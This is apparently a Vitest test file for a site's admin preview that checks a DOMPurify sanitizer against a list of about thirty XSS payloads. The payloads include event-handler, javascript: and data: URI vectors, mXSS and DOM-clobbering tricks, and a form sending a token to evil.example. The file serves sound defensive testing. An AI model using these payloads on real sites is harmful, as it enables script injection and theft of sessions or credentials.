// @vitest-environment node
import { describe, it, expect } from 'vitest';
import { JSDOM } from 'jsdom';
import { readFileSync } from 'node:fs';
import { parseFrontmatter } from '@astrojs/markdown-remark';
import { diskEntries } from './diskEntries';
import { isTreeElement, treeH, type H, type TreeElement } from './html';
import { bodyImagePaths } from './images';
import { renderBody } from './markdown';
import { PREVIEWS } from './register';
import { SANITIZE_CONFIG, createSanitizer, sanitizingH, type Sanitize } from './sanitize';

/**
 * Assainissement du HTML des corps avant `dangerouslySetInnerHTML` (plan 21,
 * F1 ; D143). Le navigateur appelle `createSanitizer(window)` ; ici la même
 * fonction, donc la même configuration DOMPurify (`SANITIZE_CONFIG`), reçoit
 * une fenêtre jsdom locale — aucun DOM global (les gabarits restent testés
 * sans `window`).
 */
const dom = new JSDOM('<!DOCTYPE html>');
const sanitizer = createSanitizer(dom.window);
if (!sanitizer) throw new Error('DOMPurify indisponible sur la fenêtre jsdom');
const sanitize: Sanitize = sanitizer;

/** Le même HTML, seulement analysé puis resérialisé (aucun retrait). */
function reserialize(html: string): string {
  const doc = new dom.window.DOMParser().parseFromString(`<!DOCTYPE html><body>${html}`, 'text/html');
  return doc.body.innerHTML;
}

/** Relève ce qui reste exécutable dans un HTML assaini. */
function liveVectors(html: string): string[] {
  const doc = new dom.window.DOMParser().parseFromString(`<!DOCTYPE html><body>${html}`, 'text/html');
  const found: string[] = [];
  const scripting = ['script', 'iframe', 'object', 'embed', 'style', 'frame', 'frameset', 'base', 'meta', 'link', 'form'];
  for (const el of doc.body.querySelectorAll('*')) {
    const tag = el.localName;
    if (scripting.includes(tag)) found.push(`<${tag}>`);
    for (const attr of el.attributes) {
      const name = attr.name.toLowerCase();
      const value = attr.value.replace(/[\u0000- ]/g, '');
      if (name.startsWith('on')) found.push(`<${tag} ${name}>`);
      if (/^(?:javascript|vbscript|data):/i.test(value) && !(tag === 'img' && name === 'src' && /^data:image\//i.test(value))) {
        found.push(`<${tag} ${name}=${attr.value}>`);
      }
      if (name === 'formaction' || name === 'action' || name === 'name') found.push(`<${tag} ${name}>`);
    }
  }
  return found;
}

const PAYLOADS: readonly string[] = [
  '<img src=x onerror="alert(1)">',
  '<img src="blob:http://localhost/x" onerror=alert(1) onload=alert(2)>',
  '<svg onload=alert(1)><circle r="4"/></svg>',
  '<svg><script>alert(1)</script><animate onbegin=alert(1) attributeName=x dur=1s>',
  '<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">x</text></a></svg>',
  '<a href="javascript:alert(1)">lien</a>',
  '<a href=" JaVaScRiPt:alert(1)">lien</a>',
  '<a href="java&#x09;script:alert(1)">lien</a>',
  '<a href="vbscript:msgbox(1)">lien</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">lien</a>',
  '<iframe src="https://evil.example/"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<script>alert(1)</script>',
  '<object data="javascript:alert(1)"></object>',
  '<embed src="javascript:alert(1)">',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
  '<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">x</maction></math>',
  '<style>@import "https://evil.example/x.css";</style>',
  // Après du contenu : la balise reste dans <body> (en tête, l'analyseur la range dans <head>).
  '<p>x</p><style>@import "https://evil.example/x.css";</style>',
  '<svg><style>@import "https://evil.example/x.css";</style></svg>',
  '<form action="https://evil.example/"><input name="token"></form>',
  '<form><button formaction="javascript:alert(1)">ok</button></form>',
  '<button formaction="javascript:alert(1)">ok</button>',
  '<details open ontoggle=alert(1)>x</details>',
  '<p style="x" onmouseover="alert(1)">survol</p>',
  '<base href="https://evil.example/">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  '<p title="<img src=x onerror=alert(1)>">titre</p>',
  '<img name="createElement" src="https://example.com/x.png">',
  '<img id="x" name="cookie"><a name="body" href="#x">a</a>',
];

describe('aperçus /admin/ : HTML des corps assaini', () => {
  it('neutralise chaque charge de la liste', () => {
    for (const payload of PAYLOADS) {
      const clean = sanitize(payload);
      // Inerte une fois analysé comme le fera l'iframe (le texte d'un
      // attribut `title` peut contenir « onerror= » sans rien exécuter)…
      expect(liveVectors(clean), `${payload} → ${clean}`).toEqual([]);
      // … et stable : le réanalyser ne fait rien réapparaître (mXSS).
      expect(sanitize(clean), payload).toBe(clean);
    }
  });

  it('garde ce qu’émet le pipeline du site : style Shiki, class, id, ancres, lang, data-*, images', () => {
    const html =
      '<h2 id="installer"><a href="#installer">Installer</a></h2>' +
      '<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="yaml"><code><span class="line"><span style="color:#22863A">k</span></span></code></pre>' +
      '<p lang="en" data-x="1"><a href="https://example.com/">ext</a> <code>a &lt; b</code></p>' +
      '<img src="blob:http://localhost:4321/0f1e2d3c" alt="Capture">' +
      '<img src="data:image/png;base64,AAAA" alt="">' +
      '<img src="https://example.com/x.png" alt="x"><img alt="non résolue">';
    expect(sanitize(html)).toBe(reserialize(html));
  });

  it('pour chaque entrée réelle, le HTML injecté assaini = le même HTML non assaini', async () => {
    const entries = (await diskEntries()).filter((entry) => Object.hasOwn(PREVIEWS, entry.collection));
    // Corps injectés par collection (un corps vide ou un guide : section omise).
    const injected = new Map<string, number>();
    let resolvedImages = 0;
    let blobSrcs = 0;
    for (const entry of entries) {
      const template = PREVIEWS[entry.collection].template;
      // Images du corps résolues en blob: (comme dans l'aperçu), puis non résolues.
      const blobs = Object.fromEntries(
        bodyImagePaths(entry.data.bodyHtml).map((path, i) => [path, `blob:http://localhost:4321/${i}`]),
      );
      resolvedImages += Object.keys(blobs).length;
      for (const images of [{}, blobs]) {
        const htmls: string[] = [];
        const collect = (tree: unknown): void => {
          if (Array.isArray(tree)) return tree.forEach(collect);
          if (!isTreeElement(tree)) return;
          const inner = tree.props.dangerouslySetInnerHTML as { __html?: string } | undefined;
          if (inner && typeof inner.__html === 'string') htmls.push(inner.__html);
          tree.children.forEach(collect);
        };
        collect(template({ ...entry.data, images }, treeH));
        for (const html of htmls) {
          if (images === blobs) blobSrcs += (sanitize(html).match(/<img [^>]*src="blob:/g) ?? []).length;
          injected.set(entry.collection, (injected.get(entry.collection) ?? 0) + 1);
          expect(sanitize(html), entry.name).toBe(reserialize(html));
        }
      }
    }
    for (const collection of Object.keys(PREVIEWS)) expect(injected.get(collection), collection).toBeGreaterThan(0);
    // Les images du corps résolues en blob: gardent leur src après assainissement.
    expect(resolvedImages).toBeGreaterThan(0);
    expect(blobSrcs).toBe(resolvedImages);
  });

  it('le HTML des quatre blocs traverse l’assainisseur inchangé ; un <iframe> du contenu est retiré', async () => {
    // Fixture des blocs (plan 23, T1) rendue par le pipeline de l'aperçu :
    // aside role/aria-label, data-*, figure du terminal, bouton caché, svg de
    // la façade vidéo, liens — rien ne doit tomber (D153 : DOMPurify inchangé).
    const fixture = new URL('../../lib/blocks/fixtures/blocs-demo.md', import.meta.url);
    const { content } = parseFrontmatter(readFileSync(fixture, 'utf8'));
    const html = await renderBody(content);
    expect(html.match(/<aside role="note"/g)).toHaveLength(4);
    expect(html).toContain('data-terminal');
    expect(html).toContain('data-entry-card="projects/gha-svu"');
    expect(html.match(/data-video=""/g)).toHaveLength(2);
    expect(sanitize(html)).toBe(reserialize(html));

    // Un <iframe> écrit dans le contenu (HTML brut du markdown) est retiré ;
    // les blocs autour restent intacts.
    const planted = `${content}\n\n<iframe src="https://www.youtube-nocookie.com/embed/aqz-KE-bpKQ?autoplay=1"></iframe>\n`;
    const withFrame = await renderBody(planted);
    expect(withFrame).toContain('<iframe');
    const clean = sanitize(withFrame);
    expect(clean).not.toMatch(/<iframe/i);
    expect(liveVectors(clean)).toEqual([]);
    expect(clean).toBe(reserialize(withFrame.replace(/<iframe[^>]*><\/iframe>/, '')));
  });

  it('sanitizingH assainit tout dangerouslySetInnerHTML et laisse le reste intact', () => {
    const safeH = sanitizingH(treeH as H<TreeElement>, sanitize);
    const tree = safeH(
      'div',
      { className: 'prose', dangerouslySetInnerHTML: { __html: '<img src=x onerror=alert(1)><p>ok</p>' } },
    ) as TreeElement;
    expect((tree.props.dangerouslySetInnerHTML as { __html: string }).__html).toBe('<img src="x"><p>ok</p>');
    expect(tree.props.className).toBe('prose');
    const plain = safeH('a', { href: '#x', key: 'k' }, 'texte') as TreeElement;
    expect(plain).toEqual(treeH('a', { href: '#x', key: 'k' }, 'texte'));
    expect(safeH('br', null)).toEqual(treeH('br', null));
  });

  it('sans DOM utilisable : pas d’assainisseur (null), jamais un passe-plat', () => {
    expect(createSanitizer({})).toBeNull();
    expect(createSanitizer(undefined)).toBeNull();
  });

  it('garde les ancres de titres homonymes de propriétés de document', () => {
    const html = '<h3 id="plugins"><a href="#plugins">Plugins</a></h3><h2 id="images"><a href="#images">Images</a></h2>';
    expect(sanitize(html)).toBe(html);
  });

  it('configuration figée : style interdit, blob: admis', () => {
    expect(Object.isFrozen(SANITIZE_CONFIG)).toBe(true);
    expect(SANITIZE_CONFIG.FORBID_TAGS).toContain('style');
    expect(SANITIZE_CONFIG.ALLOWED_URI_REGEXP.test('blob:http://localhost/x')).toBe(true);
    expect(SANITIZE_CONFIG.ALLOWED_URI_REGEXP.test('javascript:alert(1)')).toBe(false);
  });
});
